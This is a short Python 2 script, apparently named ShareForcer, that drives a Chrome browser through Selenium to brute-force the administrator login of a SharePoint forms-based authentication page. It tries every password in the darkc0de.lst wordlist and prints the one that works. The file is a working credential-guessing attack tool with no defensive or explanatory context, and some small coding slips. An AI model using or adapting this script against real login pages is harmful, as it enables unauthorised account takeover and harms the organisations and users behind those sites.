#!/usr/bin/env python

from selenium import webdriver
import time
import sys

class Passwords:

   def __init__(self,file):
      self.file = file 

   def count(self):
      count = 0
      for line in self.file:
         count = count + 1
      return count

class ShareForcer:

   def __init__(self):
      self.site = 'https://sharepoint.mydomain.com'
      self.username = 'administrator'
      self.loginurl =  self.site + '/_layouts/FBA/Login.aspx'

      self.driver = webdriver.Chrome()
      self.driver.get(self.loginurl)

   def login(self,password):
      #Try login, return true or false.
      self.driver.find_element_by_id("ctl00_PlaceHolderMain_signInControl_username").send_keys(self.username)
      self.driver.find_element_by_id("ctl00_PlaceHolderMain_signInControl_password").send_keys(password)
      self.driver.find_element_by_id("ctl00_PlaceHolderMain_signInControl_loginbutton").click()
      time.sleep(2)
      try:
         error_length = self.driver.find_element_by_id("ctl00_PlaceHolderMain_signInControl_FailureText").text
         self.driver.find_element_by_id("ctl00_PlaceHolderMain_signInControl_username").clear()
         return False
      except Exception:
         "Print couldn't get the error text"
         #This should be the homepage i.e successful login.
         print self.driver.current_url
         print "The password is %s" % password
         return True

def main():
   file = open('darkc0de.lst','r')
   p = Passwords(file)
   pcount = p.count()
   trycount = 0

   forcer = ShareForcer()
   pfile = open('darkc0de.lst','r')

   for line in pfile:
      trycount = trycount + 1
      percentage = trycount / pcount 
      print "\r%s/%s (%f)" % (trycount,pcount,percentage)
      sys.stdout.flush()
      if forcer.login(line) == True:
         break

   print "Tried.... %s" % trycount

if __name__ == '__main__':
   main()

